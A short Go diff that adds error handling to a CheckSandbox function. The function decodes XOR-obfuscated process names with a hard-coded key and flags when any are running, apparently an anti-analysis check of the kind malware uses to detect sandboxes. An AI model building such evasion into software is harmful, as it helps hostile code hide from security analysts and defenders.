@@ -85,6 +85,9 @@ func CheckSandbox() bool {
 	processSandbox := false
 	for _, process := range processes {
 		clearTextProcess, err := DeXORHex(process, "lKe4CmE5KaL")
+		if err != nil {
+			continue
+		}
 		fmt.Println(clearTextProcess)
 		if IsProcessRunning(clearTextProcess) {
 			processSandbox = true
